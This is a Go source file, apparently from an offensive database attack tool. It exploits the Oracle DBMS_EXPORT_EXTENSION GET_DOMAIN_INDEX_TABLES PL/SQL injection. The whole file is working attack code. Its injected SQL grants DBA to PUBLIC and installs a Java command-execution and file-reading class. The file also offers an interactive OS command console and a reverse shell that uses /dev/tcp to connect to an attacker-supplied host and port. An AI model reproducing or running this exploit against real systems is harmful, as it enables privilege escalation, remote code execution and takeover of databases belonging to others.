package pac

import (
	"bufio"
	"database/sql"
	"fmt"
	"os"
	"strings"
)

// GET_DOMAIN_INDEX_TABLES注入
func OracleExportExtension(conn *sql.DB) {

	_, err := OracleCMD(fmt.Sprintf("select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--','SYS',0,'1',0) from dual"), conn)
	if err != nil {
		Err(err)
	}

	_, err = OracleCMD(fmt.Sprintf("select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named \"LinxUtil\" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args){try{BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str +=stemp+\"\\n\";myReader.close();return str;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str +=stemp+\"\\n\";myReader.close();return str;} catch (Exception e){return e.toString();}}}'''';END;'';END;--','SYS',0,'1',0) from dual\n"), conn)
	if err != nil {
		Err(err)
	}

	_, err = OracleCMD(fmt.Sprintf("select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''<>'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual"), conn)
	if err != nil {
		Err(err)
	}

	_, err = OracleCMD(fmt.Sprintf("select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name''''''''LinxUtil.runCMD(java.lang.String) return String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual\n"), conn)
	if err != nil {
		Err(err)
	}

	_, err = OracleCMD(fmt.Sprintf("select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD to public'''';END;'';END;--','SYS',0,'1',0) from dual\n"), conn)
	if err != nil {
		Err(err)
	}
}

func OracleExportExtensionConsole(conn *sql.DB) {

	if *proxyAddr != "" {
		Socks5Proxy = *proxyAddr
	}

	Info("执行系统命令")
	OracleExportExtension(conn)
	reader := bufio.NewReader(os.Stdin)
	for {
		var cmd string
		fmt.Printf("%s:%s> $ ", Rhost, Rport)
		cmd, _ = reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")
		if cmd == "exit" || cmd == "q" || cmd == "quit" {
			break
		}
		resultSet, err := OracleCMD(fmt.Sprintf("select sys.LinxRunCMD('/bin/bash -c /usr/bin/%s') from dual", cmd), conn)
		for _, m := range resultSet {
			for _, value := range m {
				fmt.Println(fmt.Sprintf("%s", value))
			}
		}
		if err != nil {
			Err(err)
		}
	}
}

func OracleExportExtensionCMD(cmd string, conn *sql.DB) {
	Info("执行系统命令")
	OracleExportExtension(conn)
	resultSet, err := OracleCMD(fmt.Sprintf("select sys.LinxRunCMD('/bin/bash -c /usr/bin/%s') from dual", cmd), conn)
	for _, m := range resultSet {
		for _, value := range m {
			fmt.Println(fmt.Sprintf("%s", value))
		}
	}
	if err != nil {
		Err(err)
	}
}

// 利用DBMS_EXPORT_EXTENSION注入漏洞反弹shell
func OracleExportExtensionReverse(conn *sql.DB, Lhost string, Lport string) {

	_, err := OracleCMD(fmt.Sprintf("select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named \"shell\" as import java.io.*;import java.net.*;public class shell {public static void run() throws Exception{String[] aaa={\"/bin/bash\",\"-c\",\"exec 9<> /dev/tcp/%s/%s;exec 0<&9;exec 1>&9 2>&1;/bin/sh\"};Process p=Runtime.getRuntime().exec(aaa);}}'''';END;'';END;--','SYS',0,'1',0) from dual", Lhost, Lport), conn)
	if err != nil {
		Err(err)
	}

	_, err = OracleCMD(fmt.Sprintf("select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.net.SocketPermission'''''''', ''''''''<>'''''''', ''''''''*'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual"), conn)
	if err != nil {
		Err(err)
	}

	_, err = OracleCMD(fmt.Sprintf("select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function reversetcp RETURN VARCHAR2 as language java name ''''''''shell.run() return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual"), conn)
	if err != nil {
		Err(err)
	}

	_, err = OracleCMD(fmt.Sprintf("select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on reversetcp to public'''';END;'';END;--','SYS',0,'1',0) from dual"), conn)
	if err != nil {
		Err(err)
	}

	_, err = OracleCMD(fmt.Sprintf("select sys.reversetcp from dual"), conn)
	if err != nil {
		Err(err)
	}

}
